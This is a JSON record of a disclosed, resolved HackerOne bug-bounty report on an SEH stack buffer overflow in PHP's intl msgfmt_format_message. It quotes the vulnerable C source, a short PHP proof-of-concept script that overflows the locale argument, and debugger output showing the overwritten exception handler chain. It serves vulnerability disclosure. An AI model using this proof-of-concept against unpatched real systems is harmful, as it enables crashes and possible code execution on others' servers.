{
  "id": 170138,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzAxMzg=",
  "url": "https://hackerone.com/reports/170138",
  "title": "SEH buffer overflow msgfmt_format_message",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-09-17T23:22:50.652Z",
  "submitted_at": "2016-09-17T23:22:50.652Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fms",
    "url": "/fms",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122347Z&X-Amz-Expires=1662&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d5f3f5617207e7863299c28753ccabcab4316334653871ccf003d61c2594f8e",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T122347Z&X-Amz-Expires=1662&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a67aa169f934239c63e87f8399f380690cad1c5bf9a706ebaf181feae07aa5d1"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-13T18:10:00.008Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-13T18:09:59.939Z",
  "team_member_agreed_on_going_public_at": "2019-10-13T09:28:40.806Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Upstream bug\n---------------\nhttps://bugs.php.net/bug.php?id=73007\n\nFixed in PHP 7.0.11 and PHP 5.6.26\n---------------\nhttp://php.net/ChangeLog-5.php#5.6.26\nhttp://php.net/ChangeLog-7.php#7.0.11\n\nPatch\n-------\n```\nhttp://git.php.net/?p=php-src.git;a=commit;h=20fa323d53257a776bd7551ce7bdb2261cfe5420\n```\n\nDescription:\n------------\nBig locale string causes stack based overflow inside libicu. PHP could prevent this issue limiting length of the locale to a valid value.\n\nSource code:\nhttps://github.com/php/php-src/blob/PHP-7.0.10/ext/intl/msgformat/msgformat_format.c#L98\n\n```\nPHP_FUNCTION( msgfmt_format_message )\n{\n    zval       *args;\n    UChar      *spattern = NULL;\n    int         spattern_len = 0;\n    char       *pattern = NULL;\n    size_t      pattern_len = 0;\n    const char *slocale = NULL;\n    size_t      slocale_len = 0;\n    MessageFormatter_object mf;\n    MessageFormatter_object *mfo = &mf;\n\n    /* Parse parameters. */\n    if( zend_parse_method_parameters( ZEND_NUM_ARGS(), getThis(), \"ssa\",\n          &slocale, &slocale_len, &pattern, &pattern_len, &args ) == FAILURE )\n    {\n        intl_error_set( NULL, U_ILLEGAL_ARGUMENT_ERROR,\n            \"msgfmt_format_message: unable to parse input params\", 0 );\n\n        RETURN_FALSE;\n    }\n\n    memset(mfo, 0, sizeof(*mfo));\n    msgformat_data_init(&mfo->mf_data);\n\n    if(pattern && pattern_len) {\n        intl_convert_utf8_to_utf16(&spattern, &spattern_len, pattern, pattern_len, &INTL_DATA_ERROR_CODE(mfo));\n```\nTest script:\n---------------\n```\n<?php\n\nini_set('memory_limit', -1);\n\n$v1 = str_repeat(\"ABCE\", 503566756/3);\n$v2 = \"test\";\n$v3 = [];\n\nMessageFormatter::formatMessage($v1, $v2, $v3);\n// msgfmt_format_message($v1, $v2, $v3);\n```\n\n\nActual result:\n--------------\n```\nMicrosoft (R) Windows Debugger Version 6.11.0001.404 AMD64\nCopyright (c) Microsoft Corporation. All rights reserved.\n\nCommandLine: C:\\tools\\php7010\\php.exe -n -dextension=ext\\php_bz2.dll  -dextension=ext\\php_com_dotnet.dll  -dextension=ext\\php_curl.dll  -dextension=ext\\php_enchant.dll  -dextension=ext\\php_exif.dll  -dextension=ext\\php_fileinfo.dll  -dextension=ext\\php_ftp.dll  -dextension=ext\\php_gd2.dll  -dextension=ext\\php_gettext.dll  -dextension=ext\\php_gmp.dll  -dextension=ext\\php_imap.dll  -dextension=ext\\php_intl.dll  -dextension=ext\\php_ldap.dll  -dextension=ext\\php_mbstring.dll  -dextension=ext\\php_mysqli.dll   -dextension=ext\\php_odbc.dll  -dextension=ext\\php_openssl.dll   -dextension=ext\\php_pdo_mysql.dll   -dextension=ext\\php_pdo_odbc.dll  -dextension=ext\\php_pdo_pgsql.dll  -dextension=ext\\php_pdo_sqlite.dll  -dextension=ext\\php_pgsql.dll  -dextension=ext\\php_phpdbg_webhelper.dll  -dextension=ext\\php_shmop.dll  -dextension=ext\\php_soap.dll  -dextension=ext\\php_sockets.dll  -dextension=ext\\php_sqlite3.dll  -dextension=ext\\php_sysvshm.dll  -dextension=ext\\php_tidy.dll  -dextension=ext\\php_xmlrpc.dll  -dextension=ext\\php_xsl.dll  -dextension=ext\\php_yaml.dll poc.php\n\n...\n\n(e5c.d80): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\tools\\php7010\\icuuc57.dll\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\tools\\php7010\\icuuc57.dll - \nProcessing initial command 'r;!exploitable -v'\nicuuc57!icu_57::Locale::Locale+0x27c:\n4a85613c 8801            mov     byte ptr [ecx],al          ds:002b:05360000=00\n0:000:x86> r;!exploitable -v\neax=0535e545 ebx=00000000 ecx=05360000 edx=10201a74 esi=0535e59d edi=00000000\neip=4a85613c esp=0535e55c ebp=0535e64c iopl=0         nv up ei pl nz na po nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202\nicuuc57!icu_57::Locale::Locale+0x27c:\n4a85613c 8801            mov     byte ptr [ecx],al          ds:002b:05360000=00\n\n!exploitable 1.6.0.0\nHostMachine\\HostUser\nExecuting Processor Architecture is x86\nDebuggee is in User Mode\nDebuggee is a live user mode debugging session on the local machine\nEvent Type: Exception\nException Faulting Address: 0x5360000\nFirst Chance Exception Type: STATUS_ACCESS_VIOLATION (0xC0000005)\nException Sub-Type: Write Access Violation\n\nException Hash (Major/Minor): 0xbf0ac847.0x9fec2922\n\n Hash Usage : Stack Trace:\nMajor+Minor : icuuc57!icu_57::Locale::Locale+0x27c\nMajor+Minor : Unknown\nMajor+Minor : Unknown\nMajor+Minor : Unknown\nMajor+Minor : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\n...\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nMinor       : Unknown\nInstruction Address: 0x000000004a85613c\n\nDescription: Exception Handler Chain Corrupted\nShort Description: ExceptionHandlerCorrupted\nExploitability Classification: EXPLOITABLE\nRecommended Bug Title: Exploitable - Exception Handler Chain Corrupted starting at icuuc57!icu_57::Locale::Locale+0x000000000000027c (Hash=0xbf0ac847.0x9fec2922)\n\nCorruption of the exception handler chain is considered exploitable\n0:000:x86> !exchain\n000000000535e640: 0000000043424145\nInvalid exception stack at 0000000043424145     // Exception handler overwrote to 'ABCE'\n0:000:x86> k\nChildEBP RetAddr  \nWARNING: Stack unwind information not available. Following frames may be wrong.\n0535e64c 43424145 icuuc57!icu_57::Locale::Locale+0x27c\n0535e650 43424145 0x43424145\n0535e654 43424145 0x43424145\n0535e658 43424145 0x43424145\n0535e65c 43424145 0x43424145\n0535e660 43424145 0x43424145\n0535e664 43424145 0x43424145\n0535e668 43424145 0x43424145\n0535e66c 43424145 0x43424145\n0535e670 43424145 0x43424145\n0535e674 43424145 0x43424145\n0535e678 43424145 0x43424145\n0535e67c 43424145 0x43424145\n0535e680 43424145 0x43424145\n0535e684 43424145 0x43424145\n0535e688 43424145 0x43424145\n0535e68c 43424145 0x43424145\n0535e690 43424145 0x43424145\n0535e694 43424145 0x43424145\n0535e698 43424145 0x43424145\n```",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:28:41.037Z",
  "allow_singular_disclosure_after": -134276106.32111624,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "b69fb2ebda43240ece9dbeb",
    "armansameer",
    "dyabla"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
